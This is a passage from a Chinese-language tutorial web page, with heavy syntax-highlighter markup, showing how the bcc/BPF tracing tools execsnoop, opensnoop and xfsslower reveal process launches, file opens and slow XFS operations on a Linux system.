class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libexec</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">grepconf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f00090748941866-17\"><span class=\"crayon-i\">grep</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">12255</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12254</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">qsi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">^</span><span class=\"crayon-v\">COLOR</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">none</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">GREP_COLORS</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f00090748941866-18\"><span class=\"crayon-v\">grepconf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">sh</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">12256</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12239</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libexec</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">grepconf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f00090748941866-19\"><span class=\"crayon-i\">grep</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">12257</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12256</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">qsi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">^</span><span class=\"crayon-v\">COLOR</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">none</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">GREP</span><span class=\"crayon-sy\">_</span>COLORS</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f00090748941866-20\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0076 seconds] -->\r\n<p>哇哦。 那是什么？ 什么是 <code>grepconf.sh</code>？ 什么是 <code>/etc/GREP_COLORS</code>？ 是 <code>grep</code> 在读取它自己的配置文件……由 <code>grep</code> 运行的？ 这究竟是怎么工作的？</p>\n<p>欢迎来到有趣的系统追踪世界。 你可以学到很多关于系统是如何工作的（或者根本不工作，在有些情况下），并且发现一些简单的优化方法。 <code>execsnoop</code> 通过跟踪 <code>exec()</code> 系统调用来工作，<code>exec()</code> 通常用于在新进程中加载不同的程序代码。</p>\n<h4 id=\"toc_3\">2、 opensnoop</h4>\n<p>接着上面继续，所以，<code>grepconf.sh</code> 可能是一个 shell 脚本，对吧？ 我将运行 <code>file(1)</code> 来检查它，并使用<a href=\"https://github.com/brendangregg/perf-tools/blob/master/opensnoop\">opensnoop</a> bcc 工具来查看打开的文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f0009b161504862\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/opensnoop\r\nPID    COMM               FD ERR PATH\r\n12420  file                3   0 /etc/ld.so.cache\r\n12420  file                3   0 /lib64/libmagic.so.1\r\n12420  file                3   0 /lib64/libz.so.1\r\n12420  file                3   0 /lib64/libc.so.6\r\n12420  file                3   0 /usr/lib/locale/locale-archive\r\n12420  file               -1   2 /etc/magic.mgc\r\n12420  file                3   0 /etc/magic\r\n12420  file                3   0 /usr/share/misc/magic.mgc\r\n12420  file                3   0 /usr/lib64/gconv/gconv-modules.cache\r\n12420  file                3   0 /usr/libexec/grepconf.sh\r\n1      systemd            16   0 /proc/565/cgroup\r\n1      systemd            16   0 /proc/536/cgroup\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f0009b161504862-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f0009b161504862-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f0009b161504862-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f0009b161504862-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f0009b161504862-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f0009b161504862-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f0009b161504862-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f0009b161504862-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f0009b161504862-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f0009b161504862-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f0009b161504862-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f0009b161504862-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f0009b161504862-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f0009b161504862-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f0009b161504862-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f0009b161504862-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/opensnoop</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f0009b161504862-2\"><span class=\"crayon-e\">PID    </span><span class=\"crayon-e\">COMM               </span><span class=\"crayon-e\">FD </span><span class=\"crayon-e\">ERR </span><span class=\"crayon-i\">PATH</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f0009b161504862-3\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ld</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">cache</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f0009b161504862-4\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libmagic</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f0009b161504862-5\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libz</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f0009b161504862-6\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libc</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">6</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f0009b161504862-7\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">locale</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">locale</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">archive</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f0009b161504862-8\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">file</span><span class=\"crayon-h\">               </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">magic</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">mgc</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f0009b161504862-9\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">magic</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f0009b161504862-10\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">share</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">misc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">magic</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">mgc</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f0009b161504862-11\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">gconv</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">gconv</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">modules</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">cache</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f0009b161504862-12\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libexec</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">grepconf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">sh</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f0009b161504862-13\"><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">      </span><span class=\"crayon-i\">systemd</span><span class=\"crayon-h\">            </span><span class=\"crayon-cn\">16</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">proc</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">565</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">cgroup</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f0009b161504862-14\"><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">      </span><span class=\"crayon-i\">systemd</span><span class=\"crayon-h\">            </span><span class=\"crayon-cn\">16</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">proc</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">536</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">cgroup</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f0009b161504862-15\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0043 seconds] -->\r\n<p>像 <code>execsnoop</code> 和 <code>opensnoop</code> 这样的工具会将每个事件打印一行。上图显示 <code>file(1)</code> 命令当前打开（或尝试打开）的文件：返回的文件描述符（“FD” 列）对于 <code>/etc/magic.mgc</code> 是 -1，而 “ERR” 列指示它是“文件未找到”。我不知道该文件，也不知道 <code>file(1)</code> 正在读取的 <code>/usr/share/misc/magic.mgc</code> 文件是什么。我不应该感到惊讶，但是 <code>file(1)</code> 在识别文件类型时没有问题：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f000a0713379570\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# file /usr/share/misc/magic.mgc /etc/magic\r\n/usr/share/misc/magic.mgc: magic binary file for file(1) cmd (version 14) (little endian)\r\n/etc/magic:                magic text file for file(1) cmd, ASCII text\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a0713379570-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000a0713379570-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a0713379570-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000a0713379570-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f000a0713379570-1\"><span class=\"crayon-p\"># file /usr/share/misc/magic.mgc /etc/magic</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000a0713379570-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">share</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">misc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">magic</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">mgc</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">magic </span><span class=\"crayon-e\">binary </span><span class=\"crayon-e\">file </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">file</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cmd</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">version</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">14</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">little </span><span class=\"crayon-v\">endian</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000a0713379570-3\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">magic</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">                </span><span class=\"crayon-e\">magic </span><span class=\"crayon-e\">text </span><span class=\"crayon-e\">file </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">file</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cmd</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ASCII </span><span class=\"crayon-i\">text</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000a0713379570-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p><code>opensnoop</code> 通过跟踪 <code>open()</code> 系统调用来工作。为什么不使用 <code>strace -feopen file</code> 命令呢？ 在这种情况下是可以的。然而，<code>opensnoop</code> 的一些优点在于它能在系统范围内工作，并且跟踪所有进程的 <code>open()</code> 系统调用。注意上例的输出中包括了从 systemd 打开的文件。<code>opensnoop</code> 应该系统开销更低：BPF 跟踪已经被优化过，而当前版本的 <code>strace(1)</code> 仍然使用较老和较慢的 <code>ptrace(2)</code> 接口。</p>\n<h4 id=\"toc_4\">3、 xfsslower</h4>\n<p>bcc/BPF 不仅仅可以分析系统调用。<a href=\"https://github.com/iovisor/bcc/blob/master/tools/xfsslower.py\">xfsslower</a> 工具可以跟踪大于 1 毫秒（参数）延迟的常见 XFS 文件系统操作。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f000a4145775236\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/xfsslower 1\r\nTracing XFS operations slower than 1 ms\r\nTIME     COMM           PID    T BYTES   OFF_KB   LAT(ms) FILENAME\r\n14:17:34 systemd-journa 530    S 0       0           1.69 system.journal\r\n14:17:35 auditd         651    S 0       0           2.43 audit.log\r\n14:17:42 cksum          4167   R 52976   0           1.04 at\r\n14:17:45 cksum          4168   R 53264   0           1.62 [\r\n14:17:45 cksum          4168   R 65536   0           1.01 certutil\r\n14:17:45 cksum          4168   R 65536   0           1.01 dir\r\n14:17:45 cksum          4168   R 65536   0           1.17 dirmngr-client\r\n14:17:46 cksum          4168   R 65536   0           1.06 grub2-file\r\n14:17:46 cksum          4168   R 65536   128         1.01 grub2-fstest\r\n[...]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a4145775236-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000a4145775236-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a4145775236-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000a4145775236-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a4145775236-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000a4145775236-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a4145775236-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000a4145775236-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a4145775236-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000a4145775236-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a4145775236-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000a4145775236-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000a4145775236-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000a4145775236-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f000a4145775236-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/xfsslower 1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000a4145775236-2\"><span class=\"crayon-e\">Tracing </span><span class=\"crayon-e\">XFS </span><span class=\"crayon-e\">operations </span><span class=\"crayon-e\">slower </span><span class=\"crayon-i\">than</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ms</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000a4145775236-3\"><span class=\"crayon-e\">TIME     </span><span class=\"crayon-e\">COMM           </span><span class=\"crayon-i\">PID</span><span class=\"crayon-h\">    </span><span class=\"crayon-i\">T</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BYTES   </span><span class=\"crayon-e\">OFF_KB   </span><span class=\"crayon-e\">LAT</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ms</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">FILENAME</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000a4145775236-4\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">34</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">systemd</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">journa</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">530</span><span class=\"crayon-h\">    </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">1.69</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">system</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">journal</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000a4145775236-5\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span 